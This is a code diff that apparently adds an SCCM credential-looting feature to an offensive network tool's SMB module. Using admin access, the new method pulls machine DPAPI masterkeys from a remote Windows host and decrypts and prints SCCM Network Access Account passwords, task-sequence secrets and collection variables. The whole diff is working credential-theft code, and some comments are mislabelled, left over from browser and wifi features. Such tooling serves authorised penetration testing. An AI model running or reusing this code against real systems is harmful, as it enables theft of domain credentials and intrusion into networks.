@@ -55,6 +55,7 @@ from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 from dploot.triage.backupkey import BackupkeyTriage
 from dploot.lib.target import Target
 from dploot.lib.smb import DPLootSMBConnection
+from dploot.triage.sccm import SCCMTriage, SCCMCollection, SCCMCred, SCCMSecret
 
 from pywerview.cli.helpers import get_localdisks, get_netsession, get_netgroupmember, get_netgroup, get_netcomputer, get_netloggedon, get_netlocalgroup
 
@@ -1324,6 +1325,66 @@ class smb(connection):
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
         except Exception as e:
             self.logger.exception(str(e))
+
+    @requires_admin
+    def sccm(self):
+        logging.getLogger("dploot").disabled = True
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.fail(str(e))
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            target=self.hostname + "." + self.domain if self.kerberos else self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            no_pass=True,
+            use_kcache=self.use_kcache,
+        )
+
+        try:
+            conn = DPLootSMBConnection(target)
+            conn.smb_session = self.conn
+        except Exception as e:
+            self.logger.debug(f"Could not upgrade connection: {e}")
+            return
+        
+        try:
+            self.logger.display("Collecting Machine masterkeys, grab a coffee and be patient...")
+            masterkeys_triage = MasterkeysTriage(
+                target=target,
+                conn=conn,
+                pvkbytes=self.pvkbytes,
+            )
+            masterkeys += masterkeys_triage.triage_system_masterkeys()
+        except Exception as e:
+            self.logger.debug(f"Could not get masterkeys: {e}")
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
+            return
+        
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials")
+        try:
+            # Collect Chrome Based Browser stored secrets
+            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys)
+            sccm_creds = sccm_triage.triage_sccm()
+            for credential in sccm_creds:
+                if isinstance(credential, SCCMCred):
+                    self.logger.highlight(f"[NAA Account] {credential.username.decode('latin-1')}:{credential.password.decode('latin-1')}")
+                elif isinstance(credential, SCCMSecret):
+                    self.logger.highlight(f"[Task sequences secret] {credential.secret.decode('latin-1')}")
+                elif isinstance(credential, SCCMCollection):
+                    self.logger.highlight(f"[Collection Variable] {credential.variable.decode('latin-1')}:{credential.value.decode('latin-1')}")
+        except Exception as e:
+            self.logger.debug(f"Error while looting wifi: {e}")
 
     @requires_admin
     def dpapi(self):
